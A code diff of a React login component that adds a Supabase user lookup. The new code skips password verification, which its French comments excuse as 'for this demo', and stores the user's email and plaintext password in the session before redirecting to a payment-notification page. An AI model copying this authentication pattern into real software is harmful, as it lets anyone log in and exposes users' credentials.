@@ -3,6 +3,7 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { updateUserSession } from "@/utils/sessionUtils";
 import { toast } from "sonner";
+import { supabase, getUserByEmail } from "@/utils/supabaseClient";
 
 const Login: React.FC = () => {
   const [email, setEmail] = useState("");
@@ -10,7 +11,7 @@ const Login: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
 
@@ -20,13 +21,22 @@ const Login: React.FC = () => {
       return;
     }
 
-    // Simule une connexion
-    setTimeout(() => {
+    try {
+      // Vérifie si l'utilisateur existe déjà
+      const existingUser = await getUserByEmail(email);
+      
       // Stocke les informations dans la session
       updateUserSession({ email, password });
+      
+      // Dans un système réel, nous vérifierions le mot de passe ici
+      // Pour cette démo, nous allons juste rediriger
       setIsLoading(false);
       navigate("/payment-notification");
-    }, 800);
+    } catch (error) {
+      console.error("Erreur lors de la connexion:", error);
+      toast.error("Une erreur est survenue lors de la connexion");
+      setIsLoading(false);
+    }
   };
 
   return (
